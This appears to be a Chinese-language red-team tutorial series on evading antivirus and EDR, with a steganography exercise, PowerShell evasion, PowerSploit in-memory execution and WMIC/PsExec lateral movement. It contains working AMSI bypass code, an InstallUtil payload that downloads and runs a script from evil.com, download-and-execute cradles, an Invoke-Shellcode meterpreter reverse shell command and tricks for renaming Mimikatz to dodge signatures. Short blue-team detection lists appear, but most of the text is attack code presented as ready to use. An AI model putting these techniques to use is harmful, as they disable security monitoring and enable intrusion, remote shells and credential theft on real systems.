<p>只有那些知道隐写术存在的人，拥有密码（<code>StrongPasswordHere</code>）和 RSA 私钥（<code>pastebin_private.pem</code>）的人，才能恢复 SSH 私钥和虚拟机的访问指令。</p>
<hr>
<h3 id="实践练习：提取与解密"><a href="#实践练习：提取与解密" class="headerlink" title="实践练习：提取与解密"></a>实践练习：提取与解密</h3><p>模拟分析师或接收者恢复隐藏数据的过程：</p>
<h3 id="步骤-1-从图像元数据中提取-Pastebin-URL"><a href="#步骤-1-从图像元数据中提取-Pastebin-URL" class="headerlink" title="步骤 1: 从图像元数据中提取 Pastebin URL"></a><strong>步骤 1: 从图像元数据中提取 Pastebin URL</strong></h3><p>执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exiftool secret_image.jpg | grep <span class="hljs-string">&#x27;Comment&#x27;</span><br></code></pre></td></tr></table></figure>

<p>这将返回类似以下内容：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Comment                         : https:<span class="hljs-regexp">//</span>pastebin.com/abcXYZ<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="步骤-2-提取-SSH-私钥"><a href="#步骤-2-提取-SSH-私钥" class="headerlink" title="步骤 2: 提取 SSH 私钥"></a><strong>步骤 2: 提取 SSH 私钥</strong></h3><p>运行 <code>steghide</code> 提取嵌入的 SSH 密钥：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">steghide extract -sf secret_image.jpg -p <span class="hljs-string">&#x27;StrongPasswordHere&#x27;</span><br></code></pre></td></tr></table></figure>

<p>这将输出文件：<code>ssh_private_key.pem</code>。</p>
<hr>
<h3 id="步骤-3-从-Pastebin-获取并解密指令"><a href="#步骤-3-从-Pastebin-获取并解密指令" class="headerlink" title="步骤 3: 从 Pastebin 获取并解密指令"></a><strong>步骤 3: 从 Pastebin 获取并解密指令</strong></h3><p>从 Pastebin 获取加密的指令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://pastebin.com/raw/abcXYZ | <span class="hljs-built_in">base64</span> -d &gt; retrieved_instructions.enc<br></code></pre></td></tr></table></figure>

<p>使用 RSA 私钥解密指令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl rsautl -decrypt -inkey pastebin_private.pem -<span class="hljs-keyword">in</span> retrieved_instructions.enc -out decrypted_instructions.txt<br></code></pre></td></tr></table></figure>

<p>你现在可以在 <code>decrypted_instructions.txt</code> 中获取清晰的访问指令。</p>
<hr>
<h3 id="学习点总结"><a href="#学习点总结" class="headerlink" title="学习点总结"></a>学习点总结</h3><ul>
<li><p>隐写术提供了一种安全、隐蔽的方法来隐藏敏感文件。</p>
</li>
<li><p>将隐写术与加密的元数据和外部加密消息相结合，增强了安全性和隐蔽性。</p>
</li>
<li><p>正确的密钥管理和加密对维护数据机密性至关重要。</p>
</li>
<li><p>本技术展示了安全专家和高级威胁行为者用来进行安全、隐蔽通信的实际方法。</p>
</li>
</ul>
<hr>
<h3 id="安全影响与建议"><a href="#安全影响与建议" class="headerlink" title="安全影响与建议"></a>安全影响与建议</h3><ul>
<li><p>定期的取证分析应关注这些隐写术方法。</p>
</li>
<li><p>组织应监控和检查元数据，并实施隐写术检测程序。</p>
</li>
<li><p>对团队进行潜在的隐蔽数据外泄&#x2F;渗透技术的教育，有助于提高安全防御能力。</p>
</li>
</ul>
<h2 id="AV-EDR-规避实战技巧-9-3-直接-PowerShell-命令规避技巧"><a href="#AV-EDR-规避实战技巧-9-3-直接-PowerShell-命令规避技巧" class="headerlink" title="AV&#x2F;EDR 规避实战技巧 - 9.3 - 直接 PowerShell 命令规避技巧"></a>AV&#x2F;EDR 规避实战技巧 - 9.3 - 直接 PowerShell 命令规避技巧</h2><h3 id="概述-14"><a href="#概述-14" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>PowerShell 是一个功能强大的后渗透工具，但由于以下日志机制，AV&#x2F;EDR 解决方案通常会密切监视其使用：</p>
<ul>
<li><p><strong>ScriptBlock Logging</strong>（脚本块日志记录）</p>
</li>
<li><p><strong>Module Logging</strong>（模块日志记录）</p>
</li>
<li><p>**Command Line Logging (Event ID 4688)**（命令行日志记录）</p>
</li>
<li><p>**AMSI (Antimalware Scan Interface)**（反恶意软件扫描接口）</p>
</li>
</ul>
<p>本模块将讨论如何绕过这些检测机制，并通过本地混淆和实际示例隐蔽地运行 PowerShell 有害载荷。</p>
<hr>
<h3 id="1-为什么-PowerShell-会被监控"><a href="#1-为什么-PowerShell-会被监控" class="headerlink" title="1. 为什么 PowerShell 会被监控"></a><strong>1. 为什么 PowerShell 会被监控</strong></h3><table>
<thead>
<tr>
<th>方法</th>
<th>监控机制</th>
</tr>
</thead>
<tbody><tr>
<td>powershell.exe -enc …</td>
<td>命令行参数</td>
</tr>
<tr>
<td>IEX (Invoke-Expression)</td>
<td>脚本块日志记录</td>
</tr>
<tr>
<td>DownloadFile &#x2F; WebClient</td>
<td>AMSI</td>
</tr>
</tbody></table>
<p>因此，直接执行 PowerShell 命令必须涉及 <strong>混淆</strong>、<strong>内存技术</strong> 和 <strong>AMSI 绕过</strong>。</p>
<hr>
<h3 id="2-通过混淆进行规避"><a href="#2-通过混淆进行规避" class="headerlink" title="2. 通过混淆进行规避"></a><strong>2. 通过混淆进行规避</strong></h3><h4 id="经典-Base64-混淆"><a href="#经典-Base64-混淆" class="headerlink" title="经典 Base64 混淆"></a><strong>经典 Base64 混淆</strong></h4><p><strong>示例：</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-EncodedCommand</span> aQBlAHgAIABbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdYWFhYWFg...<span class="hljs-string">&#x27;))</span><br></code></pre></td></tr></table></figure>

<p><strong>局限性：</strong></p>
<ul>
<li><p>易于解码</p>
</li>
<li><p>会触发静态 YARA 规则</p>
</li>
<li><p>被 AMSI 检测到</p>
</li>
</ul>
<hr>
<h3 id="3-绕过-AMSI"><a href="#3-绕过-AMSI" class="headerlink" title="3. 绕过 AMSI"></a><strong>3. 绕过 AMSI</strong></h3><h4 id="在-PowerShell-中修补-AMSI"><a href="#在-PowerShell-中修补-AMSI" class="headerlink" title="在 PowerShell 中修补 AMSI"></a><strong>在 PowerShell 中修补 AMSI</strong></h4><p>这是一种已知方法，可以通过修改 PowerShell 进程中的 <code>amsi.dll</code> 内存来绕过 AMSI。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$win32</span> = <span class="hljs-string">@&quot;</span><br><span class="hljs-string">using System;</span><br><span class="hljs-string">using System.Runtime.InteropServices;</span><br><span class="hljs-string">public class Win32 &#123;</span><br><span class="hljs-string">  [DllImport(&quot;kernel32&quot;)]</span><br><span class="hljs-string">  public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);</span><br><span class="hljs-string">  [DllImport(&quot;kernel32&quot;)]</span><br><span class="hljs-string">  public static extern IntPtr LoadLibrary(string name);</span><br><span class="hljs-string">  [DllImport(&quot;kernel32&quot;)]</span><br><span class="hljs-string">  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">&quot;@</span><br><br><span class="hljs-built_in">Add-Type</span> <span class="hljs-variable">$win32</span><br><span class="hljs-variable">$ptr</span> = [<span class="hljs-type">Win32</span>]::GetProcAddress([<span class="hljs-type">Win32</span>]::LoadLibrary(<span class="hljs-string">&quot;amsi.dll&quot;</span>), <span class="hljs-string">&quot;AmsiScanBuffer&quot;</span>)<br>[<span class="hljs-type">UInt32</span>]<span class="hljs-variable">$old</span> = <span class="hljs-number">0</span><br>[<span class="hljs-type">Win32</span>]::VirtualProtect(<span class="hljs-variable">$ptr</span>, [<span class="hljs-type">UIntPtr</span>]<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x40, [<span class="hljs-type">Ref</span>]<span class="hljs-variable">$old</span>)<br><span class="hljs-variable">$bytes</span> = [<span class="hljs-built_in">Byte</span>[]] (<span class="hljs-number">0</span>xB8,<span class="hljs-number">0</span>x57,<span class="hljs-number">0</span>x00,<span class="hljs-number">0</span>x07,<span class="hljs-number">0</span>x80)  <span class="hljs-comment"># mov eax,0x80070057 (E_ACCESSDENIED)</span><br>[<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::<span class="hljs-built_in">Copy</span>(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$ptr</span>, <span class="hljs-number">5</span>)<br></code></pre></td></tr></table></figure>

<p><strong>结果</strong>: AMSI 被禁用，之后的 PowerShell 命令将不再被扫描。</p>
<hr>
<h3 id="4-内存中执行而不使用-powershell-exe"><a href="#4-内存中执行而不使用-powershell-exe" class="headerlink" title="4. 内存中执行而不使用 powershell.exe"></a><strong>4. 内存中执行而不使用 <code>powershell.exe</code></strong></h3><h4 id="C-反射执行-PowerShell-命令"><a href="#C-反射执行-PowerShell-命令" class="headerlink" title="C# 反射执行 PowerShell 命令"></a><strong>C# 反射执行 PowerShell 命令</strong></h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Management.Automation;<br><span class="hljs-keyword">using</span> System.Collections.ObjectModel;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title">Program</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[] args</span>)</span> &#123;<br>        PowerShell ps = PowerShell.Create();<br>        ps.AddScript(<span class="hljs-string">&quot;whoami; Get-Process | Out-File C:\\Temp\\procs.txt&quot;</span>);<br>        ps.Invoke();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>编译命令：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">csc /r:System.Management.Automation.dll ps_injector.cs<br></code></pre></td></tr></table></figure>

<p>这避免了使用 <code>powershell.exe</code>，而是直接通过 .NET <code>System.Management.Automation</code> 程序集执行 PowerShell 命令。</p>
<hr>
<h3 id="5-替代方法：使用-InstallUtil-exe-生活在土地上"><a href="#5-替代方法：使用-InstallUtil-exe-生活在土地上" class="headerlink" title="5. 替代方法：使用 InstallUtil.exe 生活在土地上"></a><strong>5. 替代方法：使用 <code>InstallUtil.exe</code> 生活在土地上</strong></h3><p>你可以创建一个包含 PowerShell 载荷的 .NET 可执行文件，并通过 <code>InstallUtil.exe</code>（一个已知的 LOLBIN）执行，而无需被检测。</p>
<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.Management.Automation;<br><span class="hljs-keyword">using</span> System.Configuration.Install;<br><br>[<span class="hljs-meta">System.ComponentModel.RunInstaller(true)</span>]<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span> : <span class="hljs-title">System.Configuration.Install.Installer</span> &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">override</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Uninstall</span>(<span class="hljs-params">System.Collections.IDictionary savedState</span>)</span> &#123;<br>        PowerShell ps = PowerShell.Create();<br>        ps.AddScript(<span class="hljs-string">&quot;Invoke-WebRequest -Uri http://evil.com/shell.ps1 -OutFile C:\\Temp\\evil.ps1; powershell -ExecutionPolicy Bypass -File C:\\Temp\\evil.ps1&quot;</span>);<br>        ps.Invoke();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>编译并运行：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">csc /target:library /r:System.Management.Automation.dll evil.cs<br>InstallUtil.exe /U evil.dll<br></code></pre></td></tr></table></figure>

<hr>
<h3 id="6-实战攻击链"><a href="#6-实战攻击链" class="headerlink" title="6. 实战攻击链"></a><strong>6. 实战攻击链</strong></h3><p>在一次红队演练中模拟了以下攻击链：</p>
<ul>
<li><p>使用 LOLBAS (<code>certutil</code>) 投放 <code>.ps1</code> 脚本</p>
</li>
<li><p>修补 AMSI</p>
</li>
<li><p>在内存中运行混淆后的 <code>Invoke-Mimikatz</code></p>
</li>
<li><p>使用 .NET 内的 <code>System.Net.WebClient</code> 避免使用 <code>powershell.exe</code></p>
</li>
</ul>
<hr>
<h3 id="7-蓝队的建议"><a href="#7-蓝队的建议" class="headerlink" title="7. 蓝队的建议"></a><strong>7. 蓝队的建议</strong></h3><ul>
<li><p>监控 <code>System.Management.Automation</code> 使用的 .NET 反射</p>
</li>
<li><p>设置组策略强制执行 <code>Constrained Language Mode</code></p>
</li>
<li><p>启用 AMSI 和脚本块日志记录</p>
</li>
<li><p>对命令行中的过多 Base64 编码进行警报</p>
</li>
</ul>
<hr>
<h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul>
<li><p>避免直接使用命令行中的 PowerShell</p>
</li>
<li><p>在执行载荷之前修补 AMSI 内存</p>
</li>
<li><p>使用反射或 .NET 程序集在内存中执行 PowerShell 代码</p>
</li>
<li><p>结合使用 <code>InstallUtil.exe</code> 或 <code>rundll32.exe</code> 等 LOLBIN 以提高隐蔽性</p>
</li>
</ul>
<h2 id="AV-EDR-规避实战技巧-9-4-PowerSploit-和内存执行规避"><a href="#AV-EDR-规避实战技巧-9-4-PowerSploit-和内存执行规避" class="headerlink" title="AV&#x2F;EDR 规避实战技巧 - 9.4 - PowerSploit 和内存执行规避"></a>AV&#x2F;EDR 规避实战技巧 - 9.4 - PowerSploit 和内存执行规避</h2><h3 id="概述-15"><a href="#概述-15" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>PowerSploit 是一个后渗透框架，包含多种用于权限提升、凭证窃取、持久化和侦察的 PowerShell 脚本。</p>
<p>由于 AV&#x2F;EDR 产品会积极检测 PowerSploit，因此直接在 <strong>内存中</strong> 执行，而不触及磁盘是至关重要的。本模块介绍如何隐蔽地执行 PowerSploit 脚本、规避检测（AMSI、日志记录）并保持操作安全。</p>
<hr>
<h3 id="1-什么是-PowerSploit？"><a href="#1-什么是-PowerSploit？" class="headerlink" title="1. 什么是 PowerSploit？"></a><strong>1. 什么是 PowerSploit？</strong></h3><p>PowerSploit 包含的模块包括：</p>
<ul>
<li><p><code>Invoke-Mimikatz</code> – 凭证转储</p>
</li>
<li><p><code>Invoke-ReflectivePEInjection</code> – 内存中的 PE 注入</p>
</li>
<li><p><code>Invoke-Shellcode</code> – 在内存中执行 Shellcode</p>
</li>
<li><p><code>Get-ServiceUnquoted</code> – 权限提升枚举</p>
</li>
</ul>
<p>这些脚本已被 AV 标记，因此直接使用而不做修改通常会被阻止。</p>
<hr>
<h3 id="2-为什么会被检测到"><a href="#2-为什么会被检测到" class="headerlink" title="2. 为什么会被检测到"></a><strong>2. 为什么会被检测到</strong></h3><ul>
<li><p><strong>静态签名</strong>：已知的字符串和函数（如 “Invoke-Mimikatz”）。</p>
</li>
<li><p><strong>AMSI 扫描</strong>：在 PowerShell 执行前检测恶意内容。</p>
</li>
<li><p><strong>脚本块日志记录</strong>：记录执行的完整脚本内容。</p>
</li>
<li><p><strong>命令行参数</strong>：Base64 编码的有效负载通过启发式方法被标记。</p>
</li>
</ul>
<hr>
<h3 id="3-在内存中下载-PowerSploit（不触及磁盘）"><a href="#3-在内存中下载-PowerSploit（不触及磁盘）" class="headerlink" title="3. 在内存中下载 PowerSploit（不触及磁盘）"></a><strong>3. 在内存中下载 PowerSploit（不触及磁盘）</strong></h3><p>使用 <code>IEX</code> 从内存中运行原始脚本：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-TokenManipulation.ps1&#x27;</span>)<br><span class="hljs-built_in">Invoke-TokenManipulation</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>🔥 <strong>注意</strong>：如果不进行混淆或修补 AMSI，立即会被检测到。</p>
</blockquote>
<hr>
<h3 id="4-PowerSploit-的规避技巧"><a href="#4-PowerSploit-的规避技巧" class="headerlink" title="4. PowerSploit 的规避技巧"></a><strong>4. PowerSploit 的规避技巧</strong></h3><h4 id="4-1-在加载之前修补-AMSI"><a href="#4-1-在加载之前修补-AMSI" class="headerlink" title="4.1 在加载之前修补 AMSI"></a><strong>4.1 在加载之前修补 AMSI</strong></h4><p>在运行 PowerSploit 脚本之前，总是首先中和 AMSI。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">[<span class="hljs-type">Ref</span>].Assembly.GetType(<span class="hljs-string">&#x27;System.Management.Automation.AmsiUtils&#x27;</span>).GetField(<span class="hljs-string">&#x27;amsiInitFailed&#x27;</span>,<span class="hljs-string">&#x27;NonPublic,Static&#x27;</span>).SetValue(<span class="hljs-variable">$null</span>,<span class="hljs-variable">$true</span>)<br></code></pre></td></tr></table></figure>

<blockquote>
<p>通过强制 AMSI 进入失败状态，从而绕过 AMSI 扫描。</p>
</blockquote>
<hr>
<h4 id="4-2-混淆函数名"><a href="#4-2-混淆函数名" class="headerlink" title="4.2 混淆函数名"></a><strong>4.2 混淆函数名</strong></h4><p>使用像 <a target="_blank" rel="noopener" href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a> 这样的工具：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Invoke-Obfuscation</span> <span class="hljs-literal">-ScriptPath</span> .\<span class="hljs-built_in">Invoke-Mimikatz</span>.ps1 <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;TOKEN::Elevate&quot;</span><br></code></pre></td></tr></table></figure>

<p>或者手动重命名函数：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">(<span class="hljs-built_in">Get-Content</span> <span class="hljs-built_in">Invoke-Mimikatz</span>.ps1) <span class="hljs-operator">-replace</span> <span class="hljs-string">&quot;Invoke-Mimikatz&quot;</span>,<span class="hljs-string">&quot;Start-DebugSession&quot;</span> | <span class="hljs-built_in">Set-Content</span> evade.ps1<br></code></pre></td></tr></table></figure>

<hr>
<h4 id="4-3-使用编码变体"><a href="#4-3-使用编码变体" class="headerlink" title="4.3 使用编码变体"></a><strong>4.3 使用编码变体</strong></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$payload</span> = [<span class="hljs-type">System.Convert</span>]::ToBase64String([<span class="hljs-type">System.Text.Encoding</span>]::Unicode.GetBytes((<span class="hljs-built_in">Get-Content</span> evade.ps1 <span class="hljs-literal">-Raw</span>)))<br>powershell <span class="hljs-literal">-EncodedCommand</span> <span class="hljs-variable">$payload</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="5-反射-PE-注入"><a href="#5-反射-PE-注入" class="headerlink" title="5. 反射 PE 注入"></a><strong>5. 反射 PE 注入</strong></h3><p>这是 PowerSploit 中最隐蔽的模块之一：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&quot;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1&quot;</span>)<br><br><span class="hljs-variable">$bytes</span> = [<span class="hljs-type">System.IO.File</span>]::ReadAllBytes(<span class="hljs-string">&quot;C:\\temp\\mydll.dll&quot;</span>)<br><span class="hljs-built_in">Invoke-ReflectivePEInjection</span> <span class="hljs-literal">-PEBytes</span> <span class="hljs-variable">$bytes</span> <span class="hljs-literal">-ProcId</span> <span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure>

<ul>
<li><p>DLL 被直接注入到另一个进程的内存中。</p>
</li>
<li><p>不需要将 DLL 写入磁盘。</p>
</li>
<li><p>避免了基于命令行的检测。</p>
</li>
</ul>
<hr>
<h3 id="6-使用-Invoke-Shellcode-隐蔽执行"><a href="#6-使用-Invoke-Shellcode-隐蔽执行" class="headerlink" title="6. 使用 Invoke-Shellcode 隐蔽执行"></a><strong>6. 使用 <code>Invoke-Shellcode</code> 隐蔽执行</strong></h3><p>另一种隐蔽的技术是从内存中执行原始 shellcode：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">IEX</span> (<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1&#x27;</span>)<br><span class="hljs-built_in">Invoke-Shellcode</span> <span class="hljs-literal">-Payload</span> windows/meterpreter/reverse_https <span class="hljs-literal">-Lhost</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.10</span> <span class="hljs-literal">-Lport</span> <span class="hljs-number">443</span> <span class="hljs-literal">-Force</span><br></code></pre></td></tr></table></figure>

<ul>
<li><p>这避免了将 EXE 或 DLL 文件写入磁盘。</p>
</li>
<li><p>但是，你仍然需要绕过 AMSI 并进行混淆。</p>
</li>
</ul>
<hr>
<h3 id="7-防御规避考虑"><a href="#7-防御规避考虑" class="headerlink" title="7. 防御规避考虑"></a><strong>7. 防御规避考虑</strong></h3><table>
<thead>
<tr>
<th>技术</th>
<th>检测风险</th>
<th>是否可以绕过？</th>
</tr>
</thead>
<tbody><tr>
<td>PowerSploit 原始执行</td>
<td>高</td>
<td>是，通过修补 AMSI 和混淆</td>
</tr>
<tr>
<td>Base64 编码命令</td>
<td>中</td>
<td>否，如果存在进程监控</td>
</tr>
<tr>
<td>DLL 反射注入</td>
<td>低</td>
<td>是</td>
</tr>
<tr>
<td>PowerShell 中的 Shellcode 执行</td>
<td>高</td>
<td>是</td>
</tr>
</tbody></table>
<hr>
<h3 id="8-红队最佳实践"><a href="#8-红队最佳实践" class="headerlink" title="8. 红队最佳实践"></a><strong>8. 红队最佳实践</strong></h3><ul>
<li><p>链式使用 AMSI 绕过 → 脚本块混淆 → 内存执行</p>
</li>
<li><p>避免直接使用 <code>powershell.exe</code>，考虑：</p>
<ul>
<li><p><code>System.Management.Automation.dll</code></p>
</li>
<li><p>通过 C#&#x2F;C++ 投放载荷</p>
</li>
</ul>
</li>
<li><p>在 <strong>受控的沙盒 VM</strong> 中测试载荷，以检测目标 EDR。</p>
</li>
</ul>
<hr>
<h3 id="9-蓝队检测技巧"><a href="#9-蓝队检测技巧" class="headerlink" title="9. 蓝队检测技巧"></a><strong>9. 蓝队检测技巧</strong></h3><ul>
<li><p>通过日志检测对 <code>System.Reflection</code> 和 <code>VirtualAlloc</code> 的访问</p>
</li>
<li><p>监控加载 PowerShell 命名空间的 .NET 程序集</p>
</li>
<li><p>对使用 WebClient 获取 <code>.ps1</code> 或未知 Base64 的进程进行警报</p>
</li>
</ul>
<hr>
<h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul>
<li><p>PowerSploit 强大但必须经过仔细的混淆和内存加载</p>
</li>
<li><p>在任何 PowerShell 执行之前修补 AMSI</p>
</li>
<li><p>重命名、编码或动态加载模块</p>
</li>
<li><p>使用 LOLBAS 通过不触及磁盘的方式投放 PowerShell 脚本</p>
</li>
</ul>
<h2 id="AV-EDR-规避实战技巧-9-5-WMIC-和-PsExec-横向渗透规避技巧"><a href="#AV-EDR-规避实战技巧-9-5-WMIC-和-PsExec-横向渗透规避技巧" class="headerlink" title="AV&#x2F;EDR 规避实战技巧 - 9.5 - WMIC 和 PsExec 横向渗透规避技巧"></a>AV&#x2F;EDR 规避实战技巧 - 9.5 - WMIC 和 PsExec 横向渗透规避技巧</h2><h3 id="概述-16"><a href="#概述-16" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>在许多环境中，攻击者在初步入侵后利用 <strong>WMIC</strong> 和 <strong>PsExec</strong> 进行横向渗透。这些本地工具通常被系统管理员信任并广泛使用，使其成为对抗者的理想选择。然而，它们也被大量监控。本模块重点讲解攻击者如何 <strong>避免检测</strong> 滥用这些工具，以及防御者如何进行狩猎或阻止这种滥用。</p>
<hr>
<h3 id="1-WMIC（Windows-Management-Instrumentation-命令行工具）"><a href="#1-WMIC（Windows-Management-Instrumentation-命令行工具）" class="headerlink" title="1. WMIC（Windows Management Instrumentation 命令行工具）"></a><strong>1. WMIC（Windows Management Instrumentation 命令行工具）</strong></h3><p>WMIC 允许您与 WMI 类和远程系统进行交互：</p>
<h4 id="典型攻击使用："><a href="#典型攻击使用：" class="headerlink" title="典型攻击使用："></a><strong>典型攻击使用：</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wmic /node:TARGET-PC /user:DOMAIN\user /password:pass process call create <span class="hljs-string">&quot;cmd.exe /c whoami &gt; C:\temp\result.txt&quot;</span><br></code></pre></td></tr></table></figure>

<p>这将在 <code>TARGET-PC</code> 上远程运行一个命令，并将输出存储在本地文件中。</p>
<h4 id="为什么会被检测："><a href="#为什么会被检测：" class="headerlink" title="为什么会被检测："></a><strong>为什么会被检测：</strong></h4><ul>
<li><p><strong>Windows 事件 ID 4688</strong>（进程创建）记录。</p>
</li>
<li><p>WMI 事件可通过 <strong>事件 ID 5861 &#x2F; 5859 &#x2F; 5860</strong> 查看。</p>
</li>
<li><p>WMIC 在网络上运行对非管理员使用是非常不常见的。</p>
</li>
</ul>
<hr>
<h3 id="2-PsExec（Sysinternals-工具）"><a href="#2-PsExec（Sysinternals-工具）" class="headerlink" title="2. PsExec（Sysinternals 工具）"></a><strong>2. PsExec（Sysinternals 工具）</strong></h3><p>PsExec 是一个强大的命令行工具，用于通过 SMB（端口 445）在远程系统上执行进程。</p>
<h4 id="基本使用："><a href="#基本使用：" class="headerlink" title="基本使用："></a><strong>基本使用：</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">PsExec.exe \\TARGET-PC -u DOMAIN\user -p pass cmd.exe<br></code></pre></td></tr></table></figure>

<p>它在远程计算机上创建一个服务（<code>PSEXESVC</code>），并运行该命令。它会将二进制文件丢到目标计算机并记录日志。</p>
<hr>
<h3 id="3-检测与蓝队洞察"><a href="#3-检测与蓝队洞察" class="headerlink" title="3. 检测与蓝队洞察"></a><strong>3. 检测与蓝队洞察</strong></h3><table>
<thead>
<tr>
<th>指标</th>
<th>来源</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>进程创建</td>
<td>事件 ID 4688</td>
<td>PsExec 或 WMIC 启动 <code>cmd.exe</code></td>
</tr>
<tr>
<td>445 端口网络连接</td>
<td>防火墙&#x2F;SIEM 日志</td>
<td>PsExec 使用 SMB 进行横向移动</td>
</tr>
<tr>
<td>创建 <code>PSEXESVC.exe</code></td>
<td>文件系统日志</td>
<td>总是会临时丢到目标计算机</td>
</tr>
<tr>
<td>WMI 事件</td>
<td>事件 ID 5859, 5860</td>
<td>表示远程 WMI 活动</td>
</tr>
</tbody></table>
<hr>
